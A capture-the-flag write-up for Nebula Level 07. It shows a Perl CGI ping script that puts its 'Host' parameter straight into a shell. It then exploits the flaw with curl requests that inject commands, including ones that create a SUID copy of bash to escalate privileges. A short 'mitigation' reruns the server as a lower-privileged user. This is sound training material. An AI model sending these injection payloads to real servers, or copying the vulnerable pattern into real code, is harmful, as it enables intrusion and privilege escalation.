# Level 07

The **flag07** user was writing their very first perl program that allowed them to ping hosts to see if they were reachable from the web server.

To do this level, log in as the **level07** account with the password **level07**. Files for this level can be found in /home/flag07.

## Source Code

```perl
#!/usr/bin/perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub ping {
  $host = $_[0];

  print("<html><head><title>Ping results</title></head><body><pre>");

  @output = `ping -c 3 $host 2>&1`;
  foreach $line (@output) { print "$line"; }

  print("</pre></body></html>");
  
}

# check if Host set. if not, display normal page, etc

ping(param("Host"));
```

## Writeup

This perl script use CGI to open a web page. Let's find the configuration file to get the port the script use to print the page.
List the content of **/home/flag03** directory:

```bash
level07@nebula:/home/flag07$ ll
total 10
drwxr-x--- 2 flag07 level07  102 2011-11-20 20:39 ./
drwxr-xr-x 1 root   root     160 2012-08-27 07:18 ../
-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi*
-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
```

There is the configuration file **thttpd.conf**:

```conf
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7007

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/flag07

# Do a chroot() at initialization time, restricting file access to the program's
# current directory. If chroot is the compiled-in default (not the case on
# Debian), then nochroot disables it. See thttpd(8) for details.
nochroot
#chroot

# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
# you might as well do a single chdir() with the dir option. If you are
# chrooting, this lets you put the web files in a subdirectory of the chroot
# tree, instead of in the top level mixed in with the chroot files.
#data_dir=

# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
# any symbolic links in filenames, to check that the resulting path stays within
# the original document tree. If you want to turn off this check and save some
# CPU time, you can use the nosymlinks option, however this is not
# recommended. Note, though, that if you are using the chroot option, the
# symlink checking is unnecessary and is turned off, so the safe way to save
# those CPU cycles is to use chroot.
#symlinks
#nosymlinks

# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=flag07

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a "Cache-Control: max-age"
# header to be returned with all responses. An equivalent "Expires" header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
```

The port used by the program is **7007**.
We can use the browser or **curl** command to interact with it:

```bash
curl -X GET "http://nebula:7007/index.cgi"
```

This is the output:

```html
<html><head><title>Ping results</title></head><body><pre>Usage: ping [-LRUbdfnqrvVaAD] [-c count] [-i interval] [-w deadline]
            [-p pattern] [-s packetsize] [-t ttl] [-I interface]
            [-M pmtudisc-hint] [-m mark] [-S sndbuf]
            [-T tstamp-options] [-Q tos] [hop1 ...] destination
</pre></body></html>
```

By reading the code, we can pass an argument named **Host** with an ip:

```bash
curl -X GET "http://nebula:7007/index.cgi?Host=127.0.0.1"
```

This is the output:

```html
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.012/0.013/0.015/0.003 ms
</pre></body></html>
```

The problem in the code is not check the content of the param, we can inject another command with '**;**' character url encoded.

We can find the hex value of **ascii** code with the command `man ascii` and we can discover that the url encoded version is **%3B**.

```bash
curl -X GET "http://nebula:7007/index.cgi?Host=127.0.0.1%3Bid"
```

This is the output:

```html
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.014 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.013 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.013 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.013/0.013/0.014/0.003 ms
uid=992(flag07) gid=992(flag07) groups=992(flag07)
</pre></body></html>
```

We have found a way to execute command with **flag07** account.

Let's make a copy of the **/bin/bash** binary and add to it the **SUID**.

**NB:** to write spaces in url encoded use the ascci code in hex '**%20**'.

```bash
curl -X GET "http://nebula:7007/index.cgi?Host=127.0.0.1%3Bcp%20/bin/bash%20/home/flag07/bash%3Bchmod%20u%2Bs%20/home/flag07/bash"
```

Now in the home of **flag07** user there is a bash binary with SUID.
We can now launch, inside the machine:

```bash
/home/flag07/bash -p
```

This is the output:

```bash
level07@nebula:/home/flag07$ /home/flag07/bash -p
bash-4.2$ id
uid=1008(level07) gid=1008(level07) euid=992(flag07) groups=992(flag07),1008(level07)
```

We are now logged as **flag07** user, we can run the **getflag** command:

```bash
bash-4.2$ getflag
You have successfully executed getflag on a target account
```

## Mitigation #1

Check if the configuration file in **/home/flag07** is the configuration file used by **thttpd**:

```bash
ps -faux | grep thttpd
```

With this result:

```bash
flag07    1442  0.0  0.0   2460   712 ?        Ss   05:40   0:00 /usr/sbin/thttpd -C /home/flag07/thttpd.conf
```

Yes is this the configuration file.

Let's copy to **level07** directory:

```bash
cp /home/flag07/thttpd.conf /home/level07/thttpd.conf
```

Set correct owner and privileges:

```bash
chown level07:level07 /home/level07/thttpd.conf
chmod 644 /home/level07/thttpd.conf
```

Modify **port**, **dir** and **user** as this:

```conf
# /etc/thttpd/thttpd.conf: thttpd configuration file

# This file is for thttpd processes created by /etc/init.d/thttpd.
# Commentary is based closely on the thttpd(8) 2.25b manpage, by Jef Poskanzer.

# Specifies an alternate port number to listen on.
port=7008

# Specifies a directory to chdir() to at startup. This is merely a convenience -
# you could just as easily do a cd in the shell script that invokes the program.
dir=/home/level07

# Do a chroot() at initialization time, restricting file access to the program's
# current directory. If chroot is the compiled-in default (not the case on
# Debian), then nochroot disables it. See thttpd(8) for details.
nochroot
#chroot

# Specifies a directory to chdir() to after chrooting. If you're not chrooting,
# you might as well do a single chdir() with the dir option. If you are
# chrooting, this lets you put the web files in a subdirectory of the chroot
# tree, instead of in the top level mixed in with the chroot files.
#data_dir=

# Don't do explicit symbolic link checking. Normally, thttpd explicitly expands
# any symbolic links in filenames, to check that the resulting path stays within
# the original document tree. If you want to turn off this check and save some
# CPU time, you can use the nosymlinks option, however this is not
# recommended. Note, though, that if you are using the chroot option, the
# symlink checking is unnecessary and is turned off, so the safe way to save
# those CPU cycles is to use chroot.
#symlinks
#nosymlinks

# Do el-cheapo virtual hosting. If vhost is the compiled-in default (not the
# case on Debian), then novhost disables it. See thttpd(8) for details.
#vhost
#novhost

# Use a global passwd file. This means that every file in the entire document
# tree is protected by the single .htpasswd file at the top of the tree.
# Otherwise the semantics of the .htpasswd file are the same. If this option is
# set but there is no .htpasswd file in the top-level directory, then thttpd
# proceeds as if the option was not set - first looking for a local .htpasswd
# file, and if that doesn't exist either then serving the file without any
# password. If globalpasswd is the compiled-in default (not the case on Debian),
# then noglobalpasswd disables it.
#globalpasswd
#noglobalpasswd

# Specifies what user to switch to after initialization when started as root.
user=level07

# Specifies a wildcard pattern for CGI programs, for instance "**.cgi" or
# "/cgi-bin/*". See thttpd(8) for details.
cgipat=**.cgi

# Specifies a file of throttle settings. See thttpd(8) for details.
#throttles=/etc/thttpd/throttle.conf

# Specifies a hostname to bind to, for multihoming. The default is to bind to
# all hostnames supported on the local machine. See thttpd(8) for details.
#host=

# Specifies a file for logging. If no logfile option is specified, thttpd logs
# via syslog(). If logfile=/dev/null is specified, thttpd doesn't log at all.
#logfile=/var/log/thttpd.log

# Specifies a file to write the process-id to. If no file is specified, no
# process-id is written. You can use this file to send signals to thttpd. See
# thttpd(8) for details.
#pidfile=

# Specifies the character set to use with text MIME types.
#charset=iso-8859-1

# Specifies a P3P server privacy header to be returned with all responses. See
# http://www.w3.org/P3P/ for details. Thttpd doesn't do anything at all with the
# string except put it in the P3P: response header.
#p3p=

# Specifies the number of seconds to be used in a "Cache-Control: max-age"
# header to be returned with all responses. An equivalent "Expires" header is
# also generated. The default is no Cache-Control or Expires headers, which is
# just fine for most sites.
#max_age=
```

Copy also the **index.cgi** in the level07 directory:

```bash
cp /home/flag07/index.cgi /home/level07/index.cgi
```

Set the owner and correct privileges:

```bash
chown level07:level07 /home/level07/index.cgi
chmod 0755 /home/level07/index.cgi
```

Now we can execute a new instance of the server:

```bash
thttpd -C /home/level07/thttpd.conf
```

We can try again the exploit:

```bash
curl -X GET "http://nebula:7008/index.cgi?Host=127.0.0.1%3Bid"
```

This is the ouput:

```html
<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.011 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.012 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.011/0.011/0.012/0.004 ms
uid=1008(level07) gid=1008(level07) groups=1008(level07)
</pre></body></html>
```